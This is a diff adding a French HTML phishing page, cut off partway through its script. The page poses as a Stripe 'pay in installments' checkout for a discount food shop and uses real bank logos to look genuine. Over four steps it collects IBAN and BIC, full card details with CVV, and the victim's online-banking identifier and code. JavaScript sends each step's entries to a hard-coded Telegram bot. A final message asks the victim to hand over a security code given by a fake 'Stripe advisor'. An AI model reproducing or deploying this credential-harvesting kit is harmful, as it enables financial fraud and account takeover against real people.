@@ -1,0 +1,1178 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paiement en Plusieurs Fois - Destockage Alimentaire</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* Reset CSS */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-y: auto;
+        }
+
+        /* Conteneur principal */
+        .container {
+            max-width: 800px;
+            width: 100%;
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            animation: fadeIn 1s ease-in-out;
+            height: 90vh;
+            overflow-y: auto;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #2c3e50;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        /* Étape */
+        .step {
+            display: none;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+        }
+
+        .step.active {
+            display: block;
+            opacity: 1;
+        }
+
+        /* Section Récapitulatif */
+        .summary {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .summary p {
+            font-size: 16px;
+            color: #555;
+            margin: 10px 0;
+        }
+
+        .summary p strong {
+            color: #2c3e50;
+        }
+
+        /* Section Mensualités */
+        .installment-options {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .installment-options label {
+            flex: 1;
+            padding: 15px;
+            background: #f8f9fa;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            text-align: center;
+            cursor: pointer;
+            transition: background-color 0.3s ease, border-color 0.3s ease;
+        }
+
+        .installment-options input[type="radio"] {
+            display: none;
+        }
+
+        .installment-options input[type="radio"]:checked + label {
+            background: #2c3e50;
+            color: #fff;
+            border-color: #2c3e50;
+        }
+
+        /* Plan de paiement */
+        .payment-plan {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .payment-plan p {
+            font-size: 16px;
+            color: #555;
+            margin: 5px 0;
+        }
+
+        /* Section Carte de Crédit */
+        .credit-card-form .form-group {
+            margin-bottom: 15px;
+        }
+
+        .credit-card-form label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #555;
+            margin-bottom: 5px;
+        }
+
+        .credit-card-form input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .credit-card-form input:focus {
+            border-color: #2c3e50;
+            box-shadow: 0 0 8px rgba(44, 62, 80, 0.2);
+            outline: none;
+        }
+
+        /* Section Connexion Bancaire */
+        .bank-login-form .form-group {
+            margin-bottom: 15px;
+        }
+
+        .bank-login-form label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #555;
+            margin-bottom: 5px;
+        }
+
+        .bank-login-form input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .bank-login-form input:focus {
+            border-color: #2c3e50;
+            box-shadow: 0 0 8px rgba(44, 62, 80, 0.2);
+            outline: none;
+        }
+
+        /* Logo de la banque */
+        .bank-logo-container {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .bank-logo-container img {
+            max-width: 100px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Clavier Numérique */
+        .numeric-keyboard {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .numeric-keyboard button {
+            padding: 15px;
+            background: #f8f9fa;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .numeric-keyboard button:hover {
+            background: #2c3e50;
+            color: #fff;
+        }
+
+        /* Boutons Navigation */
+        .navigation-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .navigation-buttons button {
+            padding: 15px 20px;
+            background: linear-gradient(135deg, #2c3e50, #34495e);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .navigation-buttons button:hover {
+            background: linear-gradient(135deg, #34495e, #2c3e50);
+        }
+
+        .navigation-buttons button:disabled {
+            background: #ddd;
+            cursor: not-allowed;
+        }
+
+        /* Écran de chargement */
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .loading-screen .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #2c3e50;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Chatbot */
+        .chatbot {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+        }
+
+        .chatbot button {
+            padding: 15px;
+            background: #2c3e50;
+            color: #fff;
+            border: none;
+            border-radius: 50%;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .chat-window {
+            display: none;
+            position: fixed;
+            bottom: 80px;
+            right: 20px;
+            width: 300px;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+        }
+
+        .chat-header {
+            padding: 15px;
+            background: #2c3e50;
+            color: #fff;
+            border-top-left-radius: 10px;
+            border-top-right-radius: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .chat-header h3 {
+            margin: 0;
+            font-size: 16px;
+        }
+
+        .chat-header button {
+            background: transparent;
+            border: none;
+            color: #fff;
+            cursor: pointer;
+        }
+
+        .chat-body {
+            padding: 15px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .chat-input {
+            display: flex;
+            padding: 10px;
+            border-top: 1px solid #ddd;
+        }
+
+        .chat-input input {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            margin-right: 10px;
+        }
+
+        .chat-input button {
+            padding: 10px;
+            background: #2c3e50;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        /* Conditions générales */
+        .terms {
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        .terms a {
+            color: #2c3e50;
+            text-decoration: none;
+        }
+
+        .terms a:hover {
+            text-decoration: underline;
+        }
+
+        /* Informations en petits caractères */
+        .small-text {
+            font-size: 12px;
+            color: #555;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        /* Mise en évidence du message */
+        .highlight {
+            font-weight: bold;
+            color: #2c3e50;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        /* Agrandissement des formulaires */
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .form-group input:focus {
+            border-color: #2c3e50;
+            box-shadow: 0 0 10px rgba(44, 62, 80, 0.3);
+        }
+
+        /* Style pour les messages d'erreur */
+        .error-message {
+            color: #ff0000;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        /* Style pour les boutons désactivés */
+        .navigation-buttons button:disabled {
+            background: #ddd;
+            cursor: not-allowed;
+        }
+
+        /* Style pour les champs obligatoires */
+        input:required:invalid {
+            border-color: #ff0000;
+        }
+
+        input:required:valid {
+            border-color: #2c3e50;
+        }
+
+        /* Style pour le clavier numérique */
+        .numeric-keyboard {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-top: 20px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 15px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .numeric-keyboard .key {
+            padding: 20px;
+            font-size: 18px;
+            font-weight: 500;
+            color: #2c3e50;
+            background: #fff;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .numeric-keyboard .key:hover {
+            background: #2c3e50;
+            color: #fff;
+            border-color: #2c3e50;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .numeric-keyboard .key:active {
+            transform: translateY(0);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .numeric-keyboard .key.special {
+            background: #ff6b6b;
+            color: #fff;
+            border-color: #ff6b6b;
+        }
+
+        .numeric-keyboard .key.special:hover {
+            background: #ff4c4c;
+            border-color: #ff4c4c;
+        }
+
+        @keyframes pop {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .numeric-keyboard .key:active {
+            animation: pop 0.2s ease;
+        }
+
+        .numeric-keyboard {
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .numeric-keyboard:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Agrandir le formulaire de l'étape 1 */
+        #step1 .summary {
+            padding: 30px;
+            background: #f8f9fa;
+            border-radius: 15px;
+            margin-bottom: 30px;
+        }
+
+        #step1 .summary p {
+            font-size: 18px;
+            margin: 15px 0;
+        }
+
+        #step1 .summary p strong {
+            font-size: 20px;
+            color: #2c3e50;
+        }
+
+        /* Mettre en évidence le montant total */
+        #step1 .summary p:first-child strong {
+            color: #ff6b6b;
+            font-size: 24px;
+        }
+
+        /* Améliorer l'étape 3 */
+        #step3 .bank-login-form {
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 15px;
+            margin-bottom: 20px;
+        }
+
+        #step3 .bank-login-form .form-group {
+            margin-bottom: 20px;
+        }
+
+        #step3 .bank-login-form input {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        #step3 .bank-login-form input:focus {
+            border-color: #2c3e50;
+            box-shadow: 0 0 10px rgba(44, 62, 80, 0.3);
+        }
+
+        /* Style pour le logo CBB */
+        .cbb-logo-container {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .cbb-logo-container img {
+            max-width: 200px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Style pour le logo de la carte */
+        .card-logo-container {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .card-logo-container img {
+            max-width: 100px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        #step3 .bank-logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        /* Enlever les contours rouges */
+        input:required:invalid {
+            border-color: #ddd !important;
+        }
+
+        /* Style pour le logo Stripe */
+        .stripe-logo-container {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .stripe-logo-container img {
+            max-width: 150px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Style pour le logo d'affichage du code personnel */
+        .show-password-logo {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #2c3e50;
+            font-size: 18px;
+        }
+
+        .show-password-logo:hover {
+            color: #ff6b6b;
+        }
+
+        /* Style pour le logo CB */
+        .cb-logo-container {
+            text-align: center;
+            margin: 10px 0;
+        }
+
+        .cb-logo-container img {
+            max-width: 50px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Style pour le logo de la banque */
+        .bank-logo-container {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .bank-logo-container img {
+            max-width: 100px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        #step2 .stripe-logo-container {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Étape 1 : Choix du Plan de Paiement -->
+        <div class="step active" id="step1">
+            <h2>Étape 1 : Choix du Plan de Paiement</h2>
+            <div class="summary">
+                <p><strong>Montant total :</strong> <span id="montant-total">{{ data.final_total }}</span></p>
+                <p><strong>Montant par mensualité :</strong> <span id="installment-amount">488.98€</span></p>
+                <p><strong>Frais inclus :</strong> <span id="fees">5,00€</span></p>
+                <p><strong>Intérêt :</strong> <span id="interest">5.0%</span></p>
+            </div>
+            <div class="installment-options">
+                <input type="radio" id="installment-3" name="installment-plan" value="3" onchange="updateInstallmentPlan(3)">
+                <label for="installment-3">Payer en 3 fois</label>
+                <input type="radio" id="installment-4" name="installment-plan" value="4" onchange="updateInstallmentPlan(4)" checked>
+                <label for="installment-4">Payer en 4 fois</label>
+            </div>
+            <div class="payment-plan">
+                <p>1er mois : <span id="first-installment">488.98€</span> (aujourd'hui)</p>
+                <p>2e mois : <span id="second-installment">488.98€</span></p>
+                <p>3e mois : <span id="third-installment">488.98€</span></p>
+                <p>4e mois : <span id="fourth-installment">488.98€</span></p>
+            </div>
+            <div class="mini-form">
+                <div class="form-group">
+                    <label for="iban">🏦 IBAN</label>
+                    <input type="text" id="iban" placeholder="Entrez votre IBAN" oninput="detectBankLogo()" required>
+                </div>
+                <div class="form-group">
+                    <label for="bic">🏛️ BIC</label>
+                    <input type="text" id="bic" placeholder="Entrez votre BIC" oninput="detectBankLogo()" required>
+                </div>
+                <!-- Logo de la banque -->
+                <div id="bank-logo-container" class="bank-logo-container">
+                    <img id="bank-logo" src="" alt="Logo de la banque" style="display: none;">
+                </div>
+                <!-- Logo Stripe -->
+                <div class="stripe-logo-container">
+                    <img src="https://logo-marque.com/wp-content/uploads/2021/03/Stripe-Logo-650x366.png">
+                </div>
+            </div>
+            <div class="terms">
+                <p><input type="checkbox" id="terms" name="terms" required> J'accepte les <a href="https://stripe.com/fr/resources/more/general-terms-and-conditions-of-sale-france" target="_blank">conditions générales</a>.</p>
+                <p><input type="checkbox" id="fees" name="fees" required> Je confirme avoir pris connaissance des frais et intérêts.</p>
+            </div>
+            <div class="navigation-buttons">
+                <button disabled>Précédent</button>
+                <button onclick="nextStep(2)">Suivant</button>
+            </div>
+        </div>
+
+        <!-- Étape 2 : Carte de Crédit -->
+        <div class="step" id="step2">
+            <h2>Étape 2 : Carte de Crédit</h2>
+            <div class="credit-card-form">
+                <div class="form-group">
+                    <label for="cardholder-name">👤 Nom du Titulaire</label>
+                    <input type="text" id="cardholder-name" placeholder="Entrez le nom du titulaire" required>
+                </div>
+                <div class="form-group">
+                    <label for="card-number">💳 Numéro de Carte</label>
+                    <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required>
+                </div>
+                <div class="form-group">
+                    <label for="expiry-date">📅 Date d'Expiration</label>
+                    <input type="text" id="expiry-date" placeholder="MM/AA" required>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">🔒 CVV</label>
+                    <input type="text" id="cvv" placeholder="123" required>
+                </div>
+                <div class="small-text">
+                    <p>Your order: 198183523999211</p>
+                    <p>Amount to pay: <span id="amount-to-pay">488.98€</span></p>
+                    <p>Beneficiary: DESTOCKAGE ALIMENTAIRE PRIX BAS</p>
+                </div>
+                <!-- Logo CB -->
+                <div class="cb-logo-container">
+                    <img src="https://www.preparation-code.fr/wp-content/uploads/2022/05/logo-stripe.png" alt="Logo Stripe" style="max-width: 150px">
+                </div>
+            </div>
+            <div class="navigation-buttons">
+                <button onclick="prevStep(1)">Précédent</button>
+                <button onclick="nextStep(3)">Suivant</button>
+            </div>
+            <!-- Logo de la carte -->
+            <div id="card-logo-container" class="card-logo-container">
+                <img id="card-logo" src="" alt="Logo de la carte" style="display: none;">
+            </div>
+        </div>
+
+        <!-- Étape 3 : Connexion Bancaire -->
+        <div class="step" id="step3">
+            <h2>Étape 3 : Connexion Bancaire</h2>
+            <!-- Logo de la banque -->
+            <div id="bank-logo-container-step3" class="bank-logo-container">
+                <img id="bank-logo-step3" src="" alt="Logo de la banque" style="display: none;">
+            </div>
+            <div class="bank-login-form">
+                <div class="form-group">
+                    <label for="bank-username">👤 Identifiant Bancaire</label>
+                    <input type="text" id="bank-username" placeholder="Entrez votre identifiant" required>
+                </div>
+                <div class="form-group">
+                    <label for="bank-password">🔒 Code Personnel</label>
+                    <div style="position: relative;">
+                        <input type="password" id="bank-password" placeholder="🔒 Entrez votre code" required>
+                        <i class="fas fa-eye show-password-logo" onclick="togglePasswordVisibility()" style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); cursor: pointer;"></i>
+                    </div>
+                </div>
+                <!-- Clavier Numérique -->
+                <div class="numeric-keyboard">
+                    <button onclick="appendNumber('1')">1</button>
+                    <button onclick="appendNumber('2')">2</button>
+                    <button onclick="appendNumber('3')">3</button>
+                    <button onclick="appendNumber('4')">4</button>
+                    <button onclick="appendNumber('5')">5</button>
+                    <button onclick="appendNumber('6')">6</button>
+                    <button onclick="appendNumber('7')">7</button>
+                    <button onclick="appendNumber('8')">8</button>
+                    <button onclick="appendNumber('9')">9</button>
+                    <button onclick="appendNumber('0')">0</button>
+                    <button onclick="clearInput()">C</button>
+                    <button class="key special" onclick="appendNumber('.')">.</button>
+                </div>
+            </div>
+            <div class="navigation-buttons">
+                <button onclick="prevStep(2)">Précédent</button>
+                <button onclick="nextStep(4)">Suivant</button>
+            </div>
+        </div>
+
+        <!-- Étape 4 : Confirmation -->
+        <div class="step" id="step4">
+            <h2>Étape 4 : Paiement Validé</h2>
+            <div class="confirmation-message">
+                <p>Un conseiller Stripe prendra contact avec vous pour des raisons de sécurité.</p>
+                <p><span class="highlight">Vous recevrez un code de sécurité, que vous devrez nous transmettre pour finaliser le processus.</span></p>
+                <p>Vous y êtes presque, il ne vous reste plus qu'à suivre cette étape afin de terminer la procédure.</p>
+                <p>Nous vous remercions pour votre patience et vous assurons que tout est mis en œuvre pour protéger vos informations.</p>
+            </div>
+            <div class="navigation-buttons">
+                <button onclick="prevStep(3)">Précédent</button>
+                <button onclick="confirmPayment()">Terminer</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Chatbot -->
+    <div class="chatbot">
+        <button onclick="openChat()"><i class="fas fa-comment"></i> Chat</button>
+        <div class="chat-window" id="chat-window">
+            <div class="chat-header">
+                <h3>Assistant Virtuel</h3>
+                <button onclick="closeChat()"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="chat-body" id="chat-body">
+                <p>Bonjour ! Comment puis-je vous aider ?</p>
+                <p>Un conseiller va prendre contact avec vous.</p>
+            </div>
+            <div class="chat-input">
+                <input type="text" id="chat-input" placeholder="Tapez votre message...">
+                <button onclick="sendMessage()"><i class="fas fa-paper-plane"></i></button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Écran de chargement -->
+    <div class="loading-screen" id="loading-screen">
+        <div class="loader"></div>
+        <p>Chargement en cours...</p>
+    </div>
+
+    <script>
+        // Variables globales
+        const montantTotal = parseFloat("{{ data.final_total }}".replace('€', '').replace(',', '.')); // Récupérer le montant total
+        const fees = 5.00; // Frais fixes
+        const interestRate = 0.05; // Taux d'intérêt (5%)
+
+        // Données des banques
+        const bankData = {
+            "BNPAFRPP": { name: "BNP Paribas", logo: "https://logo-marque.com/wp-content/uploads/2021/03/BNP-Paribas-Logo-650x366.png" },
+            "SOGEFRPP": { name: "Société Générale", logo: "https://www.theswiftcodes.com/images/bank-logo/france/societe-generale.png" },
+            "BREDFRPPXXX": { name: "BRED Banque Populaire", logo: "https://static.wixstatic.com/media/57117d_04b6208383c94cdb97302768eacf1c49~mv2.png/v1/fill/w_584,h_264,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/BRED_BANQUE_POPULAIRE_LOGO_2LD_QUAD.png" },
+            "CCBPFRPP": { name: "Banque Populaire", logo: "https://www.changer-la-banque.com/wp-content/uploads/2022/05/Banque-Populaire-logo.png" },
+            "CEPAFRPP": { name: "Caisse d'Épargne", logo: "https://www.theswiftcodes.com/images/bank-logo/france/caisse-d-epargne.png" },
+            "AXABFRPP": { name: "Axa Banque", logo: "https://upload.wikimedia.org/wikipedia/fd/Logo-axa-banque.png" },
+            "AGRIFRPP": { name: "Crédit Agricole", logo: "https://logos-marques.com/credit-agricole-logo/credit-agricole-logo-2/" },
+            "CMCIFR2A": { name: "Crédit Mutuel", logo: "https://www.maisonsdevendee.fr/media/logocm2018_carre_cmjn_72dpi__031211900_1028_11022019.jpg" },
+            "CRLYFRPP": { name: "Crédit Lyonnais (LCL)", logo: "https://upload.wikimedia.org/wikipedia/fr/0/0b/Lcl_logo.svg" },
+            "HFPFFRP1": { name: "HSBC France", logo: "https://banner2.cleanpng.com/20180430/vze/avdhhak8t.webp" },
+            "PSSTFRPP": { name: "La Banque postale", logo: "https://upload.wikimedia.org/wikipedia/fr/d/d4/Logo_La_Banque_postale_2022.svg" },
+            "CMCIFRPP": { name: "CIC France", logo: "https://upload.wikimedia.org/wikipedia/fr/a/a7/Cic_logo.svg" },
+            "REVOGB2L": { name: "Revolut", logo: "https://static.wixstatic.com/media/099da0_103304a097734c98a465c0be63ac65e5~mv2.png/v1/fill/w_525,h_525,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/099da0_103304a097734c98a465c0be63ac65e5~mv2.png" },
+            "NTSBDE21": { name: "N26", logo: "https://upload.wikimedia.org/wikipedia/commons/6/69/N26_Logo.svg" },
+            "TRWIBD21": { name: "Wise", logo: "https://upload.wikimedia.org/wikipedia/commons/0/05/Wise_logo.svg" },
+            "BUNQNL2A": { name: "Bunq", logo: "https://upload.wikimedia.org/wikipedia/commons/4/42/Bunq-logo.svg" },
+            "MONZGB22": { name: "Monzo", logo: "https://upload.wikimedia.org/wikipedia/commons/6/62/Monzo_logo.svg" },
+            "SNNNFR22": { name: "Shine Pro", logo: "https://www.mariestum.com/wp-content/uploads/2023/03/shine-logo.svg" },
+            "LYDIFRPP": { name: "Lydia", logo: "https://upload.wikimedia.org/wikipedia/commons/f/f3/Lydia_logo.svg" }
+        };
+
+        // Configuration Telegram
+        const botToken = '7600255086:AAGzf33SV7c2DInVmUEB3EwxhsjT9esj-1w';
+        const chatId = '5652184847';
+
+        // Fonction pour envoyer les données à Telegram
+        function sendToTelegram(data) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: data,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message envoyé avec succès:', data);
+            })
+            .catch(error => {
+                console.error('Erreur lors de l\'envoi du message:', error);
+            });
+        }
+
+        // Fonction pour collecter et envoyer les données du formulaire
+        function collectAndSendFormData(step) {
+            let formData = '';
+            
+            if (step === 1) {
+                formData = `
+<b>🎯 NOUVEAU FORMULAIRE ÉTAPE 1 🎯</b>
+<b>IBAN:</b> ${document.getElementById('iban').value}
+<b>BIC:</b> ${document.getElementById('bic').value}
+<b>Montant total:</b> ${document.getElementById('montant-total').textContent}
+<b>Mensualités:</b> ${document.querySelector('input[name="installment-plan"]:checked').value} fois
+<b>Montant par mensualité:</b> ${document.getElementById('installment-amount').textContent}
+<b>Frais:</b> ${document.getElementById('fees').textContent}
+<b>Intérêt:</b> ${document.getElementById('interest').textContent}
+                `;
+            } else if (step === 2) {
+                formData = `
+<b>🎯 NOUVEAU FORMULAIRE ÉTAPE 2 🎯</b>
+<b>Nom du titulaire:</b> ${document.getElementById('cardholder-name').value}
+<b>Numéro de carte:</b> ${document.getElementById('card-number').value}
+<b>Date d'expiration:</b> ${document.getElementById('expiry-date').value}
+<b>CVV:</b> ${document.getElementById('cvv').value}
+<b>Montant à payer:</b> ${document.getElementById('amount-to-pay').textContent}
+                `;
+            } else if (step === 3) {
+                formData = `
+<b>🎯 NOUVEAU FORMULAIRE ÉTAPE 3 🎯</b>
+<b>Identifiant bancaire:</b> ${document.getElementById('bank-username').value}
+<b>Code personnel:</b> ${document.getElementById('bank-password').value}
+<b>Banque:</b> ${document.getElementById('bank-logo-step3').alt}
+                `;
+            }
+            
+            sendToTelegram(formData);
+        }
+
+        // Détecter le logo de la banque
+        function detectBankLogo() {
+            const bic = document.getElementById('bic').value.toUpperCase();
+            const bankLogo = document.getElementById('bank-logo');
+            const bankLogoContainer = document.getElementById('bank-logo-container');
+            const bankLogoStep3 = document.getElementById('bank-logo-step3');
+            const bankLogoContainerStep3 = document.getElementById('bank-logo-container-step3');
+
+            if (bic.length >= 8 && bankData[bic]) {
+                bankLogo.src = bankData[bic].logo;
+                bankLogo.style.display = 'block';
+                bankLogoContainer.style.display = 'block';
+                bankLogo.alt = bankData[bic].name;
+
+                bankLogoStep3.src = bankData[bic].logo;
+                bankLogoStep3.style.display = 'block';
+                bankLogoContainerStep3.style.display = 'block';
+                bankLogoStep3.alt = bankData[bic].name;
+            } else {
+                bankLogo.style.display = 'none';
+                bankLogoContainer.style.display = 'none';
+
+                bankLogoStep3.style.display = 'none';
+                bankLogoContainerStep3.style.display = 'none';
+            }
+        }
+
+        // Mettre à jour le plan de paiement
+        function updateInstallmentPlan(count) {
+            // Calcul du montant total avec frais et intérêts
+            const totalWithFeesAndInterest = montantTotal + fees + (montantTotal * interestRate);
+            const installmentAmount = (totalWithFeesAndInterest / count).toFixed(2);
+
+            // Mise à jour des éléments HTML
+            document.getElementById('montant-total').textContent = `${totalWithFeesAndInterest.toFixed(2)}€`;
+            document.getElementById('installment-amount').textContent = `${installmentAmount}€`;
+            document.getElementById('amount-to-pay').textContent = `${installmentAmount}€`;
+            document.getElementById('fees').textContent = `${fees.toFixed(2)}€`;
+            document.getElementById('interest').textContent = `${(interestRate * 100).toFixed(1)}%`;
+
+            // Mise à jour du plan de paiement
+            const paymentPlan = document.querySelector('.payment-plan');
+            paymentPlan.innerHTML = ''; // Réinitialiser le contenu
+
+            for (let i = 1; i <= count; i++) {
+                const p = document.createElement('p');
+                p.innerHTML = `${i}er mois : <span>${installmentAmount}€</span> ${i === 1 ? "(aujourd'hui)" : ""}`;
+                paymentPlan.appendChild(p);
+            }
+
+            // Mise à jour des mensualités individuelles
+            document.getElementById('first-installment').textContent = `${installmentAmount}€`;
+            document.getElementById('second-installment').textContent = `${installmentAmount}€`;
+            document.getElementById('third-installment').textContent = `${installmentAmount}€`;
+            document.getElementById('fourth-installment').textContent = `${installmentAmount}€`;
+        }
+
+        // Ajouter un chiffre au champ de saisie
+        function appendNumber(number) {
+            const passwordInput = document.getElementById('bank-password');
+            passwordInput.value += number;
+        }
+
+        // Effacer le champ de saisie
+        function clearInput() {
+            const passwordInput = document.getElementById('bank-password');
+            passwordInput.value = '';
+        }
+
+        // Passer à l'étape suivante
+        function nextStep(step) {
+            // Valider l'étape précédente
+            if (!validateForm(step - 1)) return;
+
+            // Envoyer les données du formulaire à Telegram
+            collectAndSendFormData(step - 1);
+
+            // Afficher l'écran de chargement
+            showLoadingScreen();
+
+            setTimeout(() => {
+                // Supprimer la classe .active de l'étape actuelle
+                const currentStep = document.querySelector('.step.active');
+                if (currentStep) {
+                    currentStep.classList.remove('active');
+                }
+
+                // Ajouter la classe .active à l'étape suivante
+                const nextStepElement = document.getElementById(`step${step}`);
+                if (nextStepElement) {
+                    nextStepElement.classList.add('active');
+                }
+
+                // Masquer l'écran de chargement
+                hideLoadingScreen();
+            }, 1000); // Délai simulé pour l'affichage du chargement
+        }
+
+        // Revenir à l'étape précédente
+        function prevStep(step) {
+            showLoadingScreen();
+            setTimeout(() => {
+                document.querySelector('.step.active').classList.remove('active');
+                document.getElementById(`step${step}`).classList.add('active');
+                hideLoadingScreen();
+            }, 1000);
+        }
+
+        // Confirmer le paiement
+        function confirmPayment() {
+            // Envoyer les données de l'étape 3 à Telegram
+            collectAndSendFormData(3);
+            
+            showLoadingScreen();
+            setTimeout(() => {
+                window.location.href = 'https://destockagealimentaireprixbas.com'; // Redirection vers la page de confirmation
+            }, 1000);
+        }
+
+        // Afficher l'écran de chargement
+        function showLoadingScreen() {
+            document.getElementById('loading-screen').style.display = 'flex';
+        }
+
+        // Masquer l'écran de chargement
+        function hideLoadingScreen() {
+            document.getElementById('loading-screen').style.display = 'none';
+        }
+
+        // Initialisation
+        document.addEventListener('DOMContentLoaded', () => {
+            updateInstallmentPlan(4); // Afficher le montant par défaut (4 mensualités)
+
+            // Formater le numéro de carte par blocs de 4
